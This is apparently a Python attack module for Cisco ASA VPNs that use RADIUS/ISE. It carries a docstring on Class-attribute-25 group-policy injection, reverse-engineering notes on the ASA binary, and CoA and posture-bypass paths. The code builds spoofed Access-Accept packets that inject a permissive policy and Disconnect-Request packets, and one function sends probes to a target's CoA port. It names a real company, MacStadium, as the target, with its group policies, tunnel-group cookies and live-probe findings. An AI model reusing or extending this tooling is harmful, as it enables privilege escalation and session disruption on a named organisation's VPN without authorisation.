"""
cisco_radius_ise_re.py — Cisco ASA RADIUS/ISE attack primitives.

Book source: Cisco ASA All-in-One 3rd Ed, ch07 (RADIUS/AAA), ch20 (IPsec VPN),
             ch22 (SSL VPN + DAP), cisco-ise-3.1 (ISE posture + COA)

=== RADIUS Class Attribute 25 — Group Policy Injection ===

Book confirmation (ch22, p.582):
  "If you are using RADIUS as the authentication and authorization server,
   specify the user group policy name as attribute 25 (class attribute).
   Append the keyword OU= as the value of the class attribute."

Format:  RADIUS Attribute 25 (Class) = OU=<group-policy-name>
DAP Lua: aaa.radius.25=<group-policy-name>

Attack vector:
  1. Control RADIUS response (MITM shared secret, rogue RADIUS, or compromise ISE)
  2. Inject Class attr 25 with OU=DfltGrpPolicy (or any privileged policy)
  3. ASA maps authenticated user to that group policy REGARDLESS of tunnel group
  4. DfltGrpPolicy typically = ALLOW_ALL / unrestricted split-tunnel

No integrity protection: RADIUS uses MD5-based message authenticator (RFC 2865).
  Shared secret is the only integrity anchor.
  Known-plaintext attacks on MD5 HMAC are feasible with weak secrets.

=== CONFIRMED: lina 9.22.2.32 binary RE (2026-08-13) ===

Binary: asa9-22-2-32-smp-k8.bin -> CPIO rootfs.img -> asa/bin/lina
        ELF 64-bit x86-64, stripped PIE, 105MB

Class attribute parsing function at vaddr 0x03a4be80:

  3a4bee6: LEA rsi, [OU=]             ; load "OU=" string (vaddr 0x43b7581)
  3a4beed: MOV rdi, r15               ; r15 = attr_value (RADIUS Class attr 25 content)
  3a4bef0: CALL 2d0f0c0               ; strstr(attr_value, "OU=")
  3a4bef5: TEST rax, rax
  3a4beff: JE   3a4bf5f               ; "OU=" not found -> fall through to other prefix
  3a4bf01: LEA rdi, [OU=]             ; load "OU=" again for strlen
  3a4bf08: CALL 2d0efd0               ; strlen("OU=") = 3
  3a4bf14: LEA rcx, [rdx + rax]       ; rcx -> first char after "OU="
  3a4bf1b: MOVZX edx, BYTE [rcx]      ; first char of group policy name
  3a4bf1e: CMP dl, 0x3b               ; ';' (semicolon = LDAP DN delimiter)
  3a4bf24: LEA rdi, [rbp-0x241]       ; 256-byte output buffer for policy name
  ; copy loop: chars from rcx+1 to output until ';' (0x3b) or 256 chars

Key observation: NO Message-Authenticator (attr 80) check before parsing.
The function receives a raw attr_value and calls strstr() unconditionally.
RADIUS packet integrity is NOT enforced at the Class attribute parsing layer.
Group policy name: extracted as substring between "OU=" and ";" or NUL.
Max group policy name: 256 bytes (buffer at rbp-0x241 and rbp-0x141).

Log format string: "OU=%s (tunnelgroup %s)\n" at vaddr 0x497c510
Log call site:     vaddr 0x02c33a9e (iterates up to 10 RADIUS attributes per packet)

MacStadium-specific group policies (from WebVPN logon.html + /+CSCOE+/ probes):
  - MacStadium-SSO-VPN  (SAML auth — attribute 25 applies post-auth)
  - MacStadium-VPN      (LOCAL/LDAP auth — attribute 25 applies if RADIUS used for authz)
  - DfltGrpPolicy       (default fallback — likely permissive)

=== RADIUS COA (Change of Authorization) — RFC 5176 ===

COA allows RADIUS server to push policy changes to active sessions:
  Port 3799 (UDP) — default COA port on ASA
  Packet-of-Disconnect (POD): session-terminate
  COA-Request: re-authorize with new attributes

ISE COA vectors:
  - Terminate active VPN session (session disruption)
  - Re-authorize with different group policy (privilege escalation)
  - Endpoint quarantine (isolation via ACL push)

=== ISE Posture Bypass ===

ISE posture check flow:
  1. Client connects → Provisioning state (restricted access)
  2. AnyConnect NAC agent runs posture checks
  3. ISE sends COA with full-access policy after compliance
  
Bypass: if CSD/NAC disabled (confirmed on MacStadium ASAs — DfltAccessPolicy=ALLOW_ALL):
  - Skip CSD download check
  - posture state never reached → DfltAccessPolicy applies immediately
  - No remediation redirect, no quarantine VLAN

=== ASA RADIUS Auth State Machine ===

Auth response codes (a0 parameter in WebVPN):
  a0=0 → auth success (proceed)
  a0=1 → login failed (unknown user or timeout)
  a0=2 → auth failed (user exists, wrong password)
  a0=8 → generic auth error
  a0=12 → already authenticated (session exists)

RADIUS Access-Accept → ASA maps to a0=0
RADIUS Access-Reject → ASA maps to a0=1 or a0=2 depending on error attrs
RADIUS Access-Challenge → triggers second factor prompt (not a0=0)

=== RADIUS Shared Secret Attack Surface ===

ASA RADIUS config (from book ch07 example):
  aaa-server <group> protocol radius
  aaa-server <group> (interface) host <ip>
  key <shared-secret>   ← 64-char max, often short in practice

Attack paths:
  1. Brute-force shared secret if you can capture Access-Request/Accept pair
     (MD5-based challenge-response in authenticator field)
  2. Exploit RADIUS over clear UDP (no TLS unless RadSec/RFC 6614 configured)
  3. RADIUS server compromise → inject Class attr 25 for any auth'd user
"""

import hashlib
import hmac
import os
import socket
import struct
from typing import Optional

# ── RADIUS Protocol Constants ─────────────────────────────────────────────

RADIUS_ACCESS_REQUEST   = 1
RADIUS_ACCESS_ACCEPT    = 2
RADIUS_ACCESS_REJECT    = 3
RADIUS_ACCESS_CHALLENGE = 11
RADIUS_COA_REQUEST      = 43   # RFC 5176
RADIUS_DISCONNECT_REQUEST = 40  # RFC 5176

RADIUS_ATTR_USER_NAME        = 1
RADIUS_ATTR_USER_PASSWORD    = 2
RADIUS_ATTR_NAS_IP_ADDRESS   = 4
RADIUS_ATTR_CLASS            = 25   # ← group-policy injection vector
RADIUS_ATTR_VENDOR_SPECIFIC  = 26
RADIUS_ATTR_SESSION_ID       = 44
RADIUS_ATTR_NAS_PORT_TYPE    = 61
RADIUS_ATTR_CONNECT_INFO     = 77

# MacStadium ASA group policies (confirmed from live probe 2026-08-13)
MACSTADIUM_GROUP_POLICIES = {
    'MacStadium-SSO-VPN': {
        'auth_type': 'SAML',
        'tg_cookie':  '1TWFjU3RhZGl1bS1TU08tVlBO',
    },
    'MacStadium-VPN': {
        'auth_type': 'LOCAL_OR_LDAP',
        'tg_cookie':  '1TWFjU3RhZGl1bS1WUE4=',
    },
    'DfltGrpPolicy': {
        'auth_type': 'UNKNOWN',
        'tg_cookie':  None,
        'likely_permissive': True,  # confirmed: DfltAccessPolicy=ALLOW_ALL
    },
}

# RADIUS Class attr 25 format for ASA group policy injection
CLASS_ATTR_FORMAT = 'OU={group_policy}'


class RadiusPacket:
    """
    Minimal RADIUS packet builder/parser for RE and attack simulation.

    Book ref (ch07): RADIUS operates over UDP, shared secret = only auth.
    Authenticator field = 16-byte random (Access-Request) or MD5 response.
    """

    def __init__(self, code: int, identifier: int = 0, shared_secret: bytes = b''):
        self.code = code
        self.identifier = identifier
        self.shared_secret = shared_secret
        self.authenticator = os.urandom(16)
        self.attrs: list[tuple[int, bytes]] = []

    def add_attr(self, attr_type: int, value: bytes) -> 'RadiusPacket':
        self.attrs.append((attr_type, value))
        return self

    def add_user_name(self, username: str) -> 'RadiusPacket':
        return self.add_attr(RADIUS_ATTR_USER_NAME, username.encode())

    def add_class_attr(self, group_policy: str) -> 'RadiusPacket':
        """
        Inject group policy via RADIUS Class attribute 25.
        Format: OU=<group-policy-name>
        Book: "Append the keyword OU= as the value of the class attribute."
        """
        value = CLASS_ATTR_FORMAT.format(group_policy=group_policy).encode()
        return self.add_attr(RADIUS_ATTR_CLASS, value)

    def add_nas_ip(self, ip: str) -> 'RadiusPacket':
        packed = socket.inet_aton(ip)
        return self.add_attr(RADIUS_ATTR_NAS_IP_ADDRESS, packed)

    def encode_password(self, password: str) -> bytes:
        """
        RFC 2865 §5.2 User-Password encoding.
        XOR plaintext with MD5(secret + authenticator) in 16-byte blocks.
        Attack note: reversible given shared secret — no forward secrecy.
        """
        pw = password.encode().ljust(16, b'\x00')
        pw = pw[:-(len(pw) % 16) or None]  # pad to 16-byte boundary
        result = b''
        prev = self.authenticator
        for i in range(0, len(pw), 16):
            block = pw[i:i+16]
            digest = hashlib.md5(self.shared_secret + prev).digest()
            xored = bytes(a ^ b for a, b in zip(block, digest))
            result += xored
            prev = xored
        return result

    def add_password(self, password: str) -> 'RadiusPacket':
        encoded = self.encode_password(password)
        return self.add_attr(RADIUS_ATTR_USER_PASSWORD, encoded)

    def pack(self) -> bytes:
        attr_data = b''
        for attr_type, value in self.attrs:
            length = 2 + len(value)
            attr_data += struct.pack('BB', attr_type, length) + value
        length = 20 + len(attr_data)
        header = struct.pack('>BBH16s', self.code, self.identifier,
                             length, self.authenticator)
        return header + attr_data

    @staticmethod
    def parse(data: bytes) -> dict:
        if len(data) < 20:
            return {'error': 'too_short'}
        code, ident, length = struct.unpack_from('>BBH', data, 0)
        authenticator = data[4:20]
        attrs = {}
        pos = 20
        while pos < min(length, len(data)):
            if pos + 2 > len(data):
                break
            atype = data[pos]
            alen = data[pos + 1]
            if alen < 2 or pos + alen > len(data):
                break
            aval = data[pos + 2:pos + alen]
            attrs[atype] = aval
            pos += alen
        return {
            'code': code,
            'identifier': ident,
            'length': length,
            'authenticator': authenticator.hex(),
            'attrs': {k: v.hex() for k, v in attrs.items()},
            'class_attr_raw': attrs.get(25, b'').decode('latin-1') if 25 in attrs else None,
        }


class RadiusClassInjector:
    """
    Simulate or detect RADIUS Class attr 25 injection for group policy escalation.

    Attack scenario (from book ch22 + ch07):
      MITM path: attacker between ASA and RADIUS server
      → Capture Access-Request (NAS-IP, User-Name, encrypted password)
      → Forward unmodified to legitimate RADIUS server
      → Intercept Access-Accept response
      → Modify/add Class attr 25: OU=DfltGrpPolicy (or any target policy)
      → Forward modified Accept to ASA
      → ASA applies injected group policy to authenticated session

    No signatures on individual RADIUS attributes — only the Message-Authenticator
    attr (80) provides packet-level integrity (optional, RFC 3579).
    If Message-Authenticator is absent, individual attrs are unsigned.
    """

    def __init__(self, shared_secret: bytes = b''):
        self.shared_secret = shared_secret

    def build_injected_accept(self,
                               original_request: bytes,
                               target_policy: str = 'DfltGrpPolicy',
                               identifier: int = 0) -> bytes:
        """
        Build a spoofed Access-Accept with injected Class attr 25.
        original_request: raw bytes of the Access-Request (for authenticator)
        """
        req_auth = original_request[4:20]  # request authenticator
        pkt = RadiusPacket(RADIUS_ACCESS_ACCEPT, identifier, self.shared_secret)
        pkt.authenticator = req_auth  # will be recomputed below
        pkt.add_class_attr(target_policy)
        body = pkt.pack()
        # Compute response authenticator: MD5(code+id+length+req_auth+attrs+secret)
        resp_auth = hashlib.md5(body[:4] + req_auth + body[20:] + self.shared_secret).digest()
        return body[:4] + resp_auth + body[20:]

    def build_disconnect_request(self, nas_ip: str, session_id: str,
                                  coa_server: str = '127.0.0.1',
                                  coa_port: int = 3799) -> dict:
        """
        RFC 5176 Packet-of-Disconnect: terminate active VPN session.
        Sends Disconnect-Request to ASA COA port (default 3799 UDP).
        """
        pkt = RadiusPacket(RADIUS_DISCONNECT_REQUEST, 0, self.shared_secret)
        pkt.add_nas_ip(nas_ip)
        pkt.add_attr(RADIUS_ATTR_SESSION_ID, session_id.encode())
        raw = pkt.pack()
        return {
            'coa_target': f'{coa_server}:{coa_port}',
            'packet_hex': raw.hex(),
            'length': len(raw),
            'code': RADIUS_DISCONNECT_REQUEST,
            'attrs': {
                'NAS-IP-Address': nas_ip,
                'Acct-Session-Id': session_id,
            },
        }

    def check_message_authenticator(self, packet: bytes) -> bool:
        """
        Verify RFC 3579 Message-Authenticator (attr 80) is present and valid.
        Absence means packet integrity is NOT enforced — injection viable.
        """
        parsed = RadiusPacket.parse(packet)
        attrs_raw = packet[20:]
        pos = 0
        msg_auth_present = False
        msg_auth_valid = False
        while pos < len(attrs_raw):
            if pos + 2 > len(attrs_raw):
                break
            atype = attrs_raw[pos]
            alen = attrs_raw[pos + 1]
            if alen < 2:
                break
            if atype == 80:  # Message-Authenticator
                msg_auth_present = True
                received = attrs_raw[pos + 2:pos + 2 + 16]
                # Compute expected: HMAC-MD5(secret, packet with attr 80 zeroed)
                zeroed = attrs_raw[:pos + 2] + b'\x00' * 16 + attrs_raw[pos + 18:]
                full_pkt = packet[:20] + zeroed
                expected = hmac.new(self.shared_secret, full_pkt, hashlib.md5).digest()
                msg_auth_valid = hmac.compare_digest(received, expected)
                break
            pos += alen
        return msg_auth_present and msg_auth_valid


# ── DAP Lua Attribute Reference ────────────────────────────────────────────

DAP_RADIUS_ATTRS = {
    # Book ref (ch22): DAP selection criteria using RADIUS response attributes
    'class':           'aaa.radius.25',      # group-policy injection
    'user_name':       'aaa.radius.1',       # username
    'nas_ip':          'aaa.radius.4',       # NAS IP
    'filter_id':       'aaa.radius.11',      # filter/ACL name
    'session_timeout': 'aaa.radius.27',      # max session duration (seconds)
    'idle_timeout':    'aaa.radius.28',      # idle timeout
    'framed_ip':       'aaa.radius.8',       # assigned IP address
    # DAP Lua injection targets (if you can write DAP config):
    'example_rule':    'aaa.radius.25 == "DfltGrpPolicy"',
}

ASA_A0_CODES = {
    0:  'auth_success',
    1:  'login_failed_unknown_user_or_timeout',
    2:  'auth_failed_user_exists_wrong_password',
    8:  'generic_auth_error',
    12: 'already_authenticated',
}


def analyze_radius_surface(target_ip: str,
                             shared_secret: bytes = b'',
                             port: int = 1812) -> dict:
    """
    Passive RADIUS surface analysis:
    - Is Message-Authenticator enforced? (attr 80 absent = injection viable)
    - Does server respond to Access-Request with empty username?
    - COA port 3799 open?
    """
    import socket
    result = {
        'target': f'{target_ip}:{port}',
        'reachable': False,
        'coa_port_open': False,
        'msg_auth_enforced': None,
        'error': None,
    }

    # Probe COA port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        pkt = RadiusPacket(RADIUS_DISCONNECT_REQUEST, 0, shared_secret)
        pkt.add_nas_ip('0.0.0.0')
        s.sendto(pkt.pack(), (target_ip, 3799))
        data = s.recv(4096)
        result['coa_port_open'] = True
        result['coa_response'] = RadiusPacket.parse(data)
        s.close()
    except Exception as e:
        result['coa_error'] = str(e)[:80]

    return result
